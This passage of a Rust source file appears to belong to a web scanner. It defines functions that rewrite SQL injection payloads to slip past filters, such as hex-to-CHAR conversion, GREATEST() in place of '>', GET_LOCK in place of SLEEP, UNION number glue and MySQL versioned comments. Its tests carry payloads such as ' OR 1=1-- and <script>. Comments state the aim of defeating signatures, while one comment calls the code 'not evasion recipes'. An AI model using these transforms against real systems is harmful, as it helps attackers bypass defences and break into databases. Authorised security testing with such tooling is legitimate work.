            "{}LIMIT {} OFFSET {}{}",
            &input[..pos],
            parts[1],
            parts[0],
            rest
        );
    }
    input.to_string()
}

/// Rewrite `MID(a,b,c)` as `MID(a FROM b FOR c)`, removing the commas.
fn commaless_mid(input: &str) -> String {
    if let Some((prefix, args, rest)) = take_call(input, "mid") {
        if args.len() == 3 {
            return format!(
                "{prefix}MID({} FROM {} FOR {}){rest}",
                args[0], args[1], args[2]
            );
        }
    }
    input.to_string()
}

/// Rewrite `IF(a,b,c)` as `CASE WHEN a THEN b ELSE c END`.
fn if_to_case(input: &str) -> String {
    if let Some((prefix, args, rest)) = take_call(input, "if") {
        if args.len() == 3 {
            return format!(
                "{prefix}CASE WHEN {} THEN {} ELSE {} END{rest}",
                args[0], args[1], args[2]
            );
        }
    }
    input.to_string()
}

/// Rewrite `0xABCD` literals as `CHAR(0xAB,0xCD)`, so the `0x` hex prefix a
/// filter keys on never appears in the shape it expects.
fn hex2char(input: &str) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::with_capacity(input.len());
    let mut i = 0;
    while i < chars.len() {
        let is_hex_prefix = chars[i] == '0'
            && chars
                .get(i + 1)
                .map(|c| *c == 'x' || *c == 'X')
                .unwrap_or(false)
            && chars.get(i + 2).map(|c| c.is_ascii_hexdigit()).unwrap_or(false);
        if is_hex_prefix {
            let mut j = i + 2;
            while chars.get(j).map(|c| c.is_ascii_hexdigit()).unwrap_or(false) {
                j += 1;
            }
            let hex: String = chars[i + 2..j].iter().collect();
            if hex.len() % 2 == 0 {
                let parts: Vec<String> = hex
                    .as_bytes()
                    .chunks(2)
                    .map(|p| format!("0x{}", std::str::from_utf8(p).unwrap_or("00")))
                    .collect();
                out.push_str(&format!("CHAR({})", parts.join(",")));
                i = j;
                continue;
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

/// Rewrite a simple `X>Y` comparison as `GREATEST(X,Y)=X`.
///
/// The two forms are equivalent for numbers, and the rewritten form contains
/// no `>` operator for a signature to match. Only operands made of ASCII
/// alphanumerics or `_` are rewritten; anything else is returned unchanged
/// rather than corrupted.
fn greatest_obfuscation(input: &str) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::with_capacity(input.len() + 16);
    let is_operand = |c: char| c.is_ascii_alphanumeric() || c == '_';
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '>' {
            let mut left_start = i;
            while left_start > 0 && is_operand(chars[left_start - 1]) {
                left_start -= 1;
            }
            let mut right_end = i + 1;
            while right_end < chars.len() && is_operand(chars[right_end]) {
                right_end += 1;
            }
            if left_start < i && right_end > i + 1 {
                let left: String = chars[left_start..i].iter().collect();
                let right: String = chars[i + 1..right_end].iter().collect();
                // The operand was copied verbatim, so its byte length equals
                // its character count (ASCII only).
                out.truncate(out.len() - (i - left_start));
                out.push_str(&format!("GREATEST({left},{right})={left}"));
                i = right_end;
                continue;
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

/// `AND`/`OR` -> `&&`/`||` on word boundaries (MySQL/MariaDB).
fn symbolic_logical(input: &str) -> String {
    let stage = replace_word_ci(input, "AND", "&&");
    replace_word_ci(&stage, "OR", "||")
}

/// Case-insensitive replace of a whole word (letters not touching another
/// alphanumeric or `_`), leaving surrounding spaces intact.
fn replace_word_ci(input: &str, word: &str, replacement: &str) -> String {
    let lower = input.to_lowercase();
    let lword = word.to_lowercase();
    let chars: Vec<char> = input.chars().collect();
    // Byte offset of each char, so we can index `lower` (ASCII words only).
    let mut out = String::with_capacity(input.len());
    let mut i = 0usize; // char index
    // Precompute byte offsets.
    let byte_offsets: Vec<usize> = {
        let mut v = Vec::with_capacity(chars.len() + 1);
        let mut b = 0;
        for c in &chars {
            v.push(b);
            b += c.len_utf8();
        }
        v.push(b);
        v
    };
    while i < chars.len() {
        let byte_i = byte_offsets[i];
        if lower[byte_i..].starts_with(&lword) {
            let end = i + word.chars().count();
            let before_ok = i == 0 || !(chars[i - 1].is_alphanumeric() || chars[i - 1] == '_');
            let after_ok = end >= chars.len()
                || !(chars[end].is_alphanumeric() || chars[end] == '_');
            if before_ok && after_ok {
                out.push_str(replacement);
                i = end;
                continue;
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

/// Replace a bare `=` with `RLIKE`, leaving compound operators alone. RLIKE is
/// a regex match, so this is only equivalent for the matched differential and
/// is flagged as semantics-changing.
fn equals_to_rlike(input: &str) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::with_capacity(input.len() + 16);
    for (i, &c) in chars.iter().enumerate() {
        if c == '=' {
            let prev = if i > 0 { chars[i - 1] } else { ' ' };
            let next = chars.get(i + 1).copied().unwrap_or(' ');
            if matches!(prev, '!' | '<' | '>' | '=') || matches!(next, '=' | '<' | '>') {
                out.push(c);
                continue;
            }
            out.push_str(" RLIKE ");
        } else {
            out.push(c);
        }
    }
    out
}

/// `IFNULL(a,b)` -> `IF(ISNULL(a),b,a)` or, when `case_form`, the equivalent
/// `CASE WHEN ISNULL(a) THEN (b) ELSE (a) END`.
fn ifnull_rewrite(input: &str, case_form: bool) -> String {
    if let Some((prefix, args, rest)) = take_call(input, "ifnull") {
        if args.len() == 2 {
            let (a, b) = (args[0].trim(), args[1].trim());
            let rewritten = if case_form {
                format!("CASE WHEN ISNULL({a}) THEN ({b}) ELSE ({a}) END")
            } else {
                format!("IF(ISNULL({a}),{b},{a})")
            };
            return format!("{prefix}{rewritten}{rest}");
        }
    }
    input.to_string()
}

/// `SLEEP(n)` -> `GET_LOCK('<alias>',n)`: an alternate MySQL time primitive.
/// The lock alias is fixed so the payload stays deterministic.
fn sleep_to_get_lock(input: &str) -> String {
    if let Some((prefix, args, rest)) = take_call(input, "sleep") {
        if args.len() == 1 {
            return format!("{prefix}GET_LOCK('bt_lock',{}){rest}", args[0].trim());
        }
    }
    input.to_string()
}

/// `MID(a,b,c)` -> `RIGHT(LEFT(a,(b)+(c)-1),c)`, an equivalent substring built
/// from LEFT/RIGHT for when MID/SUBSTRING is filtered.
fn mid_to_left_right(input: &str) -> String {
    if let Some((prefix, args, rest)) = take_call(input, "mid") {
        if args.len() == 3 {
            let (a, b, c) = (args[0].trim(), args[1].trim(), args[2].trim());
            return format!("{prefix}RIGHT(LEFT({a},({b})+({c})-1),{c}){rest}");
        }
    }
    input.to_string()
}

/// Splice `glue` between a numeric literal and a following `UNION`, dropping
/// the whitespace between them, so the parser reads `<number><glue>UNION`
/// (e.g. `1 UNION` -> `1e0UNION`). If no `<digits> UNION` boundary is present
/// the input is returned unchanged rather than mangled.
fn union_number_glue(input: &str, glue: &str) -> String {
    let lower = input.to_ascii_lowercase();
    let bytes = input.as_bytes();
    let mut out = String::with_capacity(input.len() + glue.len());
    let mut i = 0usize;
    while i < bytes.len() {
        let is_union = lower[i..].starts_with("union")
            && (i + 5 == bytes.len() || !bytes[i + 5].is_ascii_alphanumeric());
        if is_union {
            let trimmed = out.trim_end_matches(char::is_whitespace);
            if trimmed.len() < out.len() && trimmed.ends_with(|c: char| c.is_ascii_digit()) {
                let keep = trimmed.len();
                out.truncate(keep);
                out.push_str(glue);
                out.push_str(&input[i..i + 5]); // preserve UNION's original case
                i += 5;
                continue;
            }
        }
        // `union` is ASCII, and we only ever land mid-token on ASCII here, but
        // copy a full char to stay UTF-8 safe.
        let ch = input[i..].chars().next().unwrap();
        out.push(ch);
        i += ch.len_utf8();
    }
    out
}

/// The representation variants appropriate for a location.
///
/// These are *representation* choices, not evasion recipes: each changes
/// only how the same logical test is serialized, so the engine can tell
/// whether a difference came from the application or from an intermediary
/// decoder.
pub fn variants_for(context: RepresentationContext) -> Vec<Vec<TransformKind>> {
    match context {
        RepresentationContext::QueryValue => vec![
            vec![],
            vec![TransformKind::UrlEncode],
            vec![TransformKind::CommentSpace],
            vec![TransformKind::PlusSpace],
            vec![TransformKind::KeywordCase],
            vec![TransformKind::PartialUrlEncode],
            vec![TransformKind::DoubleUrlEncode],
            vec![TransformKind::TabSpace],
            vec![TransformKind::MysqlVersionedComment],
        ],
        RepresentationContext::FormValue => vec![
            vec![],
            vec![TransformKind::PlusSpace],
            vec![TransformKind::UrlEncode],
            vec![TransformKind::CommentSpace],
        ],
        RepresentationContext::JsonString => vec![
            vec![],
            vec![TransformKind::JsonEscape],
            vec![TransformKind::UnicodeEscape],
            vec![TransformKind::CommentSpace],
        ],
        RepresentationContext::HeaderValue => vec![
            vec![],
            vec![TransformKind::TabSpace],
            vec![TransformKind::UrlEncode],
        ],
        RepresentationContext::CookieValue => vec![
            vec![],
            vec![TransformKind::UrlEncode],
            vec![TransformKind::CommentSpace],
        ],
        RepresentationContext::PathSegment => vec![
            vec![],
            vec![TransformKind::UrlEncode],
            vec![TransformKind::DoubleUrlEncode],
        ],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn url_encode_escapes_quotes_and_spaces() {
        let out = apply_transform("' OR 1=1--", TransformKind::UrlEncode);
        assert!(out.contains("%27"), "quote not encoded: {out}");
        assert!(out.contains("%20"), "space not encoded: {out}");
    }

    #[test]
    fn comment_space_replaces_spaces() {
        assert_eq!(apply_transform("AND 1=1", TransformKind::CommentSpace), "AND/**/1=1");
    }

    #[test]
    fn plus_space_replaces_spaces() {
        assert_eq!(apply_transform("AND 1=1", TransformKind::PlusSpace), "AND+1=1");
    }

    #[test]
    fn keyword_case_changes_sql_keywords() {
        let out = apply_transform("select 1 union select 2", TransformKind::KeywordCase);
        assert_ne!(out, "select 1 union select 2");
        assert!(out.to_lowercase().contains("select"));
    }

    #[test]
    fn double_url_encode_is_reversible_by_one_decode() {
        let once = apply_transform("'", TransformKind::UrlEncode);
        let twice = apply_transform("'", TransformKind::DoubleUrlEncode);
        assert!(twice.contains("%25"), "double encode should encode the percent: {twice}");
        assert_ne!(once, twice);
    }

    #[test]
    fn json_escape_escapes_quotes_and_backslashes() {
        let out = apply_transform("a\"b\\c", TransformKind::JsonEscape);
        assert_eq!(out, "a\\\"b\\\\c");
    }

    #[test]
    fn html_entity_encodes_angle_brackets() {
        let out = apply_transform("<script>", TransformKind::HtmlEntityEncode);
        assert!(!out.contains('<'));
        assert!(out.contains("&lt;"));
    }

    #[test]
    fn unicode_escape_encodes_specials() {
        let out = apply_transform("'", TransformKind::UnicodeEscape);
        assert_eq!(out, "\\u0027");
    }

    #[test]
    fn trace_records_every_step() {
        let trace = TransformationTrace::new("' OR 1=1")
            .apply(TransformKind::CommentSpace)
            .apply(TransformKind::UrlEncode);
        assert_eq!(trace.steps.len(), 2);
        assert_eq!(trace.summary(), "comment_space+url_encode");
        assert_ne!(trace.final_representation, trace.original);
    }

    #[test]
    fn identity_trace_summary() {
        assert_eq!(TransformationTrace::new("x").summary(), "identity");
    }

    #[test]
    fn every_context_offers_an_identity_variant() {
        for ctx in [
            RepresentationContext::QueryValue,
            RepresentationContext::FormValue,
            RepresentationContext::JsonString,
            RepresentationContext::HeaderValue,
            RepresentationContext::CookieValue,
            RepresentationContext::PathSegment,
        ] {
            let variants = variants_for(ctx);
            assert!(variants.iter().any(|v| v.is_empty()), "{ctx:?} had no identity variant");
        }
    }

    #[test]
    fn query_context_offers_multiple_variants() {
        assert!(variants_for(RepresentationContext::QueryValue).len() >= 4);
    }

    #[test]
    fn keyword_case_is_deterministic() {
        let a = apply_transform("select", TransformKind::KeywordCase);
        let b = apply_transform("select", TransformKind::KeywordCase);
        assert_eq!(a, b);
    }

    #[test]
    fn mysql_versioned_comment_wraps_keywords() {
        let out = apply_transform("UNION SELECT NULL", TransformKind::MysqlVersionedComment);
        assert!(out.contains("/*!50000UNION*/"), "UNION not versioned: {out}");
        assert!(out.contains("/*!50000SELECT*/"), "SELECT not versioned: {out}");
        // A generic comment stripper collapses it to inert text; MySQL runs it.
        assert!(out.contains("/*!50000"));
    }
}
